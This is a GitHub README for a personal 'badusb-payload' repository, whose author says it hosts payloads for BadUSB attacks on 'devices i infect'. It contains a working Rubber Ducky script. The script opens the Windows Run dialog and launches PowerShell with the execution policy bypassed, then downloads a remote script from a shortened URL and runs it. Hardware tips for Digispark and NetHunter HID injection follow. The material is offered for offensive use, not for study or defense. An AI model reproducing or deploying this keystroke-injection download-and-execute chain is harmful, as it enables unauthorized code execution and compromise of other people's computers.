# badusb-payload
Move along, i use this simply to host my payload for my badusb attacks. ^^
That means it's most likely very messy code that which has the goal to do my bidding on devices i infect.

To run my code i use this DUCKY script:
```
DELAY 500
GUI r
DELAY 100
STRING powershell -Exec Bypass "iex ((New-Object System.Net.WebClient).DownloadString('https://3.ly/ao519'))"
ENTER
```
The link is shortened so the ducky doesn't have to type such long of a string.
What it does isn't really a big of a deal. It merely does the powershell equivalent of CURLing payload.ps1 in this repository and runs it.
The actual payload is in that script. I hate powershell, by the way. <_<

# HOW this works:
You may use an arduino, a hak5 rubberducky stick OR, if you get lucky, like this humble shigal here, have a phone that supports a kali nethunter kernel which can put your phone into HID mode to do all kinds of funny shenanigans. It then acts as a keyboard and types in what you wish. In my case, it opens the RUN dialogue with win+r, waits 100 milliseconds and executes my powershell payload from the url. Done!

# Arduino Recommendations:
I recommend a DigiStump Digispark, but be careful with it. Always make sure not to kill the bootloader. You have to disconnect it, start the code upload, give it five seconds, plug it in and then the arduino will upload it. It will run your own payload on your own machine, but if you want to keep the arduino intact, please don't be as dumdum as me. Keep it inside until it is fully flashed.
